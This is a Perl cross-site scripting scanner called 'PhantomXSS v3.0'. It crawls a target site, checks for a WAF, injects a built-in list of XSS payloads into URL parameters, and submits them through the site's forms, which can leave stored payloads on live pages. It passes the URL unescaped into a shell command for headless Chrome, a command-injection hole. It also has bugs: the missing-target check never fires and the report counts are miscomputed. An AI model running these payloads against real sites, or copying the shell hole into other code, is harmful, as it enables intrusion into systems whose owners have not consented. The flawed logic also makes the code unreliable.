#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use LWP::UserAgent;
use URI;
use URI::QueryParam;
use HTML::LinkExtor;
use Term::ANSIColor;
use WWW::Mechanize;
use JSON;
use File::Basename;
use POSIX qw(strftime);

# ASCII Art Banner
print color('bold cyan');
print q{
                                                                                                                                                  
            ,---,                                ___                       ____                                                                   
,-.----.  ,--.' |                              ,--.'|_                   ,'  , `.                                                                 
\    /  \ |  |  :                      ,---,   |  | :,'   ,---.       ,-+-,.'  |                                                                 
|   :    |:  :  :                  ,-+-. /  |  :  : ' :  '   ,'\   ,-+-. ;   , ||                              ,--,  ,--,   .--.--.    .--.--.    
|   | .\ ::  |  |,--.  ,--.--.    ,--.'|'   |.;_,'  /  /   /   | ,--.'|'   |  ||                              |'. \/ .`|  /  /    '  /  /    '   
.   : |: ||  :  '   | /       \  |   |  ,"' ||  |   |  .   ; ,. :|   |  ,', |  |,                              '  \/  / ; |  :  /`./ |  :  /`./   
|   |  \ :|  |   /' :.--.  .-. | |   | /  | |:__,'| :  '   | |: :|   | /  | |--'                                \  \.' /  |  :  ;_   |  :  ;_     
|   : .  |'  :  | | | \__\/: . . |   | |  | |  '  : |__'   | .; :|   : |  | ,                                    \  ;  ;   \  \    `. \  \    `.  
:     |`-'|  |  ' | : ," .--.; | |   | |  |/   |  | '.'|   :    ||   : |  |/                      ___           / \  \  \   `----.   \ `----.   \ 
:   : :   |  :  :_:,'/  /  ,.  | |   | |--'    ;  :    ;\   \  / |   | |`-'                    .'  .`|        ./__;   ;  \ /  /`--'  //  /`--'  / 
|   | :   |  | ,'   ;  :   .'   \|   |/        |  ,   /  `----'  |   ;/                     .'  .'   :        |   :/\  \ ;'--'.     /'--'.     /  
`---'.|   `--''     |  ,     .-./'---'          ---`-'           '---'                   ,---, '   .'         `---'  `--`   `--'---'   `--'---'   
  `---`              `--`---'                                                            ;   |  .'                                                
                                                                                         `---'

};
print color('bold red');
print "\n                                     💀 PhantomXSS Scanner v3.0 💀\n";
print color('bold white');
print "                              🚀 Advanced XSS Detection Framework 🚀\n";
print color('bold green');
print "                          ✨ NEW: JSON Reports | Cookie Support | WAF Detection ✨\n";
print color('reset');
print "\n";

my ($url, $wordlist, $url_file, $scan_mode, $output_file, $verbose, $threads, $delay, $user_agent, $cookies, $help);
my $start_time = time();
my @vulnerabilities = ();

GetOptions(
    "u=s"       => \$url,
    "w=s"       => \$wordlist,
    "uw=s"      => \$url_file,
    "s=s"       => \$scan_mode,
    "o=s"       => \$output_file,
    "v"         => \$verbose,
    "t=i"       => \$threads,
    "delay=i"   => \$delay,
    "ua=s"      => \$user_agent,
    "cookies=s" => \$cookies,
    "h|help"    => \$help
);

if ($help) {
    show_help();
    exit;
}

if (!\$url && !\$url_file) {
    print color('bold red'), "\n❌ Error: No target specified!\n\n", color('reset');
    show_help();
    exit 1;
}

# Set defaults
$scan_mode = $scan_mode || 'all';
$threads = $threads || 1;
$delay = $delay || 0;
$user_agent = $user_agent || 'Mozilla/5.0 (PhantomXSS/3.0) AppleWebKit/537.36';

# 📂 Load payloads
$wordlist = $wordlist ? $wordlist : "payloads.txt";
unless (-f $wordlist) {
    create_default_payloads($wordlist);
}

open(my $fh, '<', $wordlist) or die "Could not open '$wordlist': $!\n";
my @payloads = <$fh>;
chomp @payloads;
close($fh);

print color('bold cyan'), "[📂] Loaded " . scalar(@payloads) . " payloads from $wordlist\n", color('reset');
@payloads = @payloads[0..9] if @payloads > 10; # Limit to 10 for performance

# 🌍 Load targets
my @targets;
if ($url_file) {
    open(my $ufh, '<', $url_file) or die "Could not open URL list: $url_file\n";
    @targets = <$ufh>;
    chomp @targets;
    close($ufh);
    print color('bold cyan'), "[🎯] Loaded " . scalar(@targets) . " targets from $url_file\n", color('reset');
} else {
    push @targets, $url;
}

# Enhanced UA with cookie support
my $ua = LWP::UserAgent->new(
    timeout => 8,
    max_redirect => 3,
    agent => $user_agent
);

# Add cookies if provided
if ($cookies) {
    $ua->default_header('Cookie' => $cookies);
    print color('bold green'), "[🍪] Using cookies: $cookies\n", color('reset');
}

print color('bold yellow'), "\n[🚀] Starting scan with mode: $scan_mode\n", color('reset');
print color('bold yellow'), "[⏰] Start time: " . strftime("%Y-%m-%d %H:%M:%S", localtime()) . "\n", color('reset');

foreach my $target_url (@targets) {
    my %visited;
    my @to_visit = ($target_url);

    print color('bold blue');
    print "\n[🌐] Starting PhantomXSS crawl on: $target_url\n";
    print color('reset');

    # WAF Detection
    detect_waf($target_url);

    while (my $url = shift @to_visit) {
        next if $visited{$url}++;
        next unless $url =~ /^\Q$target_url/;

        my $res = $ua->get($url);
        next unless $res->is_success;

        print color('green'), "[✅] Crawled: $url\n", color('reset');
        
        if ($verbose) {
            print color('cyan'), "    Response size: " . length($res->decoded_content) . " bytes\n", color('reset');
            print color('cyan'), "    Status: " . $res->code . "\n", color('reset');
        }

        my $extor = HTML::LinkExtor->new(undef, $url);
        $extor->parse($res->decoded_content);
        my @links = $extor->links;

        for my $link_tuple (@links) {
            my ($tag, %attr) = @$link_tuple;
            next unless $tag eq 'a';
            my $link = $attr{href} || next;
            my $abs = URI->new_abs($link, $url);
            push @to_visit, $abs;
        }

        if ($scan_mode eq 'all' || $scan_mode eq 'r') {
            scan_reflected_xss($url);
        }
        if ($scan_mode eq 'all' || $scan_mode eq 'sd') {
            scan_stored_xss_enhanced($url);
        }
        if ($scan_mode eq 'all' || $scan_mode eq 'd') {
            scan_dom_xss($url);
        }
        
        # Add delay if specified
        sleep($delay) if $delay > 0;
    }
}

# Generate final report
generate_report();

sub show_help {
    print color('bold white');
    print qq{
🔥 PhantomXSS Scanner v3.0 - Advanced XSS Detection Framework 🔥

USAGE:
    perl xss-perl.pl -u <url> -w <payloads.txt> -s <mode> [OPTIONS]
    perl xss-perl.pl -uw <url_list.txt> -w <payloads.txt> -s <mode> [OPTIONS]

REQUIRED:
    -u <url>           Single target URL
    -uw <file>         File containing list of URLs
    -s <mode>          Scan mode: all|r|d|sd

SCAN MODES:
    all                Complete scan (Reflected + Stored + DOM)
    r                  Reflected XSS only (fastest)
    sd                 Stored XSS only
    d                  DOM XSS only

NEW OPTIONS:
    -w <file>          Payload wordlist (default: payloads.txt)
    -o <file>          Output results to JSON file
    -v                 Verbose output with details
    -t <num>           Number of threads (default: 1)
    --delay <sec>      Delay between requests (default: 0)
    --ua <string>      Custom User-Agent string
    --cookies <string> Cookie header for authenticated scans
    -h, --help         Show this help menu

EXAMPLES:
    # Basic scan
    perl xss-perl.pl -u https://example.com -s all

    # Fast reflected XSS scan
    perl xss-perl.pl -u https://example.com -s r -o results.json

    # Authenticated scan with cookies
    perl xss-perl.pl -u https://app.com -s all --cookies "session=abc123"

    # Verbose scan with custom payloads
    perl xss-perl.pl -u https://target.com -w custom.txt -s all -v

    # Batch scan with delay
    perl xss-perl.pl -uw targets.txt -s all --delay 2 -o report.json

};
    print color('reset');
}

sub create_default_payloads {
    my ($filename) = @_;
    print color('yellow'), "[⚠️] Creating default payload file: $filename\n", color('reset');
    
    my @default_payloads = (
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '\'" onmouseover=alert(1) x="',
        '"><svg/onload=confirm(1)>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert(1)>',
        '<svg onload=alert(1)>',
        '<details ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>'
    );
    
    open(my $fh, '>', $filename) or die "Cannot create $filename: $!";
    for my $payload (@default_payloads) {
        print $fh "$payload\n";
    }
    close($fh);
    
    print color('green'), "[✅] Created $filename with " . scalar(@default_payloads) . " default payloads\n", color('reset');
}

sub detect_waf {
    my ($url) = @_;
    print color('bold magenta'), "[🛡️] Detecting WAF/Protection...\n", color('reset');
    
    my $test_payload = '<script>alert("waf_test")</script>';
    my $uri = URI->new($url);
    $uri->query_param('test', $test_payload);
    
    my $response = $ua->get($uri);
    if ($response->is_success) {
        my $content = $response->decoded_content;
        my $headers = $response->headers->as_string;
        
        # Check for common WAF signatures
        if ($content =~ /cloudflare|cf-ray/i || $headers =~ /cloudflare/i) {
            print color('red'), "[🛡️] Cloudflare detected!\n", color('reset');
        } elsif ($content =~ /access denied|forbidden|blocked/i) {
            print color('red'), "[🛡️] Possible WAF detected!\n", color('reset');
        } else {
            print color('green'), "[✅] No obvious WAF detected\n", color('reset');
        }
    }
}

sub scan_reflected_xss {
    my ($url) = @_;
    my $uri = URI->new($url);
    my @params = $uri->query_param;
    return unless @params;

    print color('bold yellow'), "[🔎] Testing Reflected XSS on: $url\n", color('reset');

    foreach my $payload (@payloads) {
        foreach my $param (@params) {
            my $test_uri = $uri->clone;
            $test_uri->query_param($param, $payload);
            my $response = $ua->get($test_uri);
            
            if ($response->is_success && $response->decoded_content =~ /\Q$payload\E/) {
                print color('bold red'), "[💥] Reflected XSS FOUND: ", color('reset');
                print color('red'), "$test_uri\n", color('reset');
                
                push @vulnerabilities, {
                    type => 'Reflected XSS',
                    url => "$test_uri",
                    parameter => $param,
                    payload => $payload,
                    timestamp => strftime("%Y-%m-%d %H:%M:%S", localtime())
                };
                
                if ($verbose) {
                    print color('cyan'), "    Parameter: $param | Payload: $payload\n", color('reset');
                    print color('cyan'), "    Response length: " . length($response->decoded_content) . "\n", color('reset');
                }
            }
        }
    }
}

sub scan_stored_xss_enhanced {
    my ($url) = @_;

    print color('bold yellow'), "[📝] Testing Stored XSS on: $url\n", color('reset');

    my $mech = WWW::Mechanize->new(
        autocheck => 0, 
        timeout => 8,
        max_redirect => 3,
        agent => $user_agent
    );
    
    # Add cookies to mechanize if provided
    if ($cookies) {
        $mech->default_header('Cookie' => $cookies);
    }
    
    eval {
        local $SIG{ALRM} = sub { die "timeout\n" };
        alarm(20);
        
        my $res = $mech->get($url);
        unless ($res && $res->is_success) {
            print color('yellow'), "[⚠️] Cannot access: $url\n", color('reset');
            alarm(0);
            return;
        }

        my @forms = $mech->forms;
        unless (@forms) {
            print color('yellow'), "[⚠️] No forms found on: $url\n", color('reset');
            alarm(0);
            return;
        }

        print color('green'), "[📝] Found " . scalar(@forms) . " form(s) on: $url\n", color('reset');

        my $form_count = 0;
        FORM: for my $form_index (1 .. scalar(@forms)) {
            last if ++$form_count > 3; # Test up to 3 forms
            
            eval {
                $mech->get($url);
                
                # Enhanced form selection with better error handling
                my $form;
                eval {
                    $form = $mech->form_number($form_index);
                };
                
                if ($@ || !$form) {
                    print color('yellow'), "[⚠️] Cannot select form $form_index\n", color('reset');
                    next FORM;
                }

                # Better input detection
                my @inputs = ();
                eval {
                    @inputs = $form->inputs;
                };
                
                if ($@ || !@inputs) {
                    print color('yellow'), "[⚠️] No inputs in form $form_index\n", color('reset');
                    next FORM;
                }

                my $has_text_input = 0;
                my @text_fields = ();
                
                for my $input (@inputs) {
                    next unless defined $input;
                    
                    # Safe method calls with error checking
                    my $type = '';
                    my $name = '';
                    
                    eval {
                        $type = $input->type || '';
                        $name = $input->name || '';
                    };
                    
                    if (!$@ && $name && ($type eq 'text' || $type eq 'textarea' || $type eq 'email' || $type eq 'search')) {
                        $has_text_input = 1;
                        push @text_fields, { input => $input, name => $name, type => $type };
                    }
                }
                
                unless ($has_text_input) {
                    print color('yellow'), "[⚠️] No text inputs in form $form_index\n", color('reset');
                    next FORM;
                }

                print color('green'), "[🎯] Form $form_index has " . scalar(@text_fields) . " testable field(s)\n", color('reset');

                # Test payloads
                my $payload_count = 0;
                for my $payload (@payloads) {
                    last if ++$payload_count > 3; # Limit payloads per form
                    
                    print color('yellow'), "[🔍] Testing payload: $payload\n", color('reset');
                    
                    # Reset form
                    eval {
                        $mech->get($url);
                        $mech->form_number($form_index);
                    };
                    
                    if ($@) {
                        print color('yellow'), "[⚠️] Cannot reset form\n", color('reset');
                        next;
                    }
                    
                    # Fill text fields safely
                    for my $field_info (@text_fields) {
                        eval {
                            $mech->field($field_info->{name}, $payload);
                        };
                        
                        if ($@) {
                            print color('yellow'), "[⚠️] Cannot fill field: " . $field_info->{name} . "\n", color('reset') if $verbose;
                        }
                    }

                    # Submit form
                    eval {
                        local $SIG{ALRM} = sub { die "submit timeout\n" };
                        alarm(8);
                        $mech->click();
                        alarm(0);
                    };
                    
                    if ($@) {
                        print color('yellow'), "[⚠️] Form submission error: $@\n", color('reset');
                        next;
                    }

                    # Check for stored XSS
                    if ($mech->content && $mech->content =~ /\Q$payload\E/) {
                        print color('bold magenta'), "[🔥] STORED XSS FOUND: ", color('reset');
                        print color('magenta'), "$url with payload: $payload\n", color('reset');
                        
                        push @vulnerabilities, {
                            type => 'Stored XSS',
                            url => $url,
                            payload => $payload,
                            form => $form_index,
                            timestamp => strftime("%Y-%m-%d %H:%M:%S", localtime())
                        };
                    }
                    
                    sleep(0.5); # Brief pause
                }
            };
            
            if ($@) {
                print color('yellow'), "[⚠️] Error in form $form_index: " . substr($@, 0, 50) . "...\n", color('reset');
                next FORM;
            }
        }
        
        alarm(0);
    };
    
    if ($@) {
        print color('yellow'), "[⚠️] Stored XSS scan error: " . substr($@, 0, 50) . "...\n", color('reset');
    }
}

sub scan_dom_xss {
    my ($url) = @_;
    print color('bold yellow'), "[👁️] Testing DOM XSS on: $url\n", color('reset');

    foreach my $payload (@payloads) {
        my $test_url = URI->new($url);
        my @params = $test_url->query_param;
        next unless @params;

        foreach my $param (@params) {
            $test_url->query_param($param, $payload);
            my $cmd = "timeout 10 google-chrome --headless --disable-gpu --dump-dom \"$test_url\" 2>/dev/null";
            my $dom = `$cmd`;
            if ($dom =~ /\Q$payload\E/) {
                print color('bold cyan'), "[👁️] DOM XSS FOUND: ", color('reset');
                print color('cyan'), "$test_url\n", color('reset');
                
                push @vulnerabilities, {
                    type => 'DOM XSS',
                    url => "$test_url",
                    parameter => $param,
                    payload => $payload,
                    timestamp => strftime("%Y-%m-%d %H:%M:%S", localtime())
                };
            }
        }
    }
}

sub generate_report {
    my $end_time = time();
    my $duration = $end_time - $start_time;
    
    print color('bold green'), "\n" . "="x60 . "\n", color('reset');
    print color('bold white'), "           🏁 PHANTOMXSS SCAN COMPLETE 🏁\n", color('reset');
    print color('bold green'), "="x60 . "\n", color('reset');
    
    print color('bold yellow'), "📊 SCAN SUMMARY:\n", color('reset');
    print color('white'), "   ⏱️  Duration: ${duration}s\n", color('reset');
    print color('white'), "   🎯 Vulnerabilities found: " . scalar(@vulnerabilities) . "\n", color('reset');
    print color('white'), "   📅 End time: " . strftime("%Y-%m-%d %H:%M:%S", localtime()) . "\n\n", color('reset');
    
    if (@vulnerabilities) {
        print color('bold red'), "🚨 VULNERABILITIES DETECTED:\n", color('reset');
        my %vuln_types;
        for my $vuln (@vulnerabilities) {
            $vuln_types{$vuln->{type}}++;
        }
        
        for my $type (keys %vuln_types) {
            print color('red'), "   • $type: " . $vuln_types{$type} . "\n", color('reset');
        }
        print "\n";
    } else {
        print color('green'), "✅ No XSS vulnerabilities detected\n\n", color('reset');
    }
    
    # Generate JSON report if requested
    if ($output_file) {
        my $report = {
            scan_info => {
                version => "PhantomXSS v3.0",
                start_time => strftime("%Y-%m-%d %H:%M:%S", localtime($start_time)),
                end_time => strftime("%Y-%m-%d %H:%M:%S", localtime($end_time)),
                duration => $duration,
                scan_mode => $scan_mode,
                user_agent => $user_agent
            },
            vulnerabilities => \@vulnerabilities,
            summary => {
                total_vulnerabilities => scalar(@vulnerabilities),
                vulnerability_types => {
                    map { $_ => scalar(grep { $_->{type} eq $_ } @vulnerabilities) } 
                    ('Reflected XSS', 'Stored XSS', 'DOM XSS')
                }
            }
        };
        
        open(my $json_fh, '>', $output_file) or die "Cannot create $output_file: $!";
        print $json_fh JSON->new->pretty->encode($report);
        close($json_fh);
        
        print color('bold cyan'), "📄 JSON report saved to: $output_file\n", color('reset');
    }
    
    print color('bold blue'), "\n🎉 Thanks for using PhantomXSS! Happy hunting! 🕷️\n\n", color('reset');
}
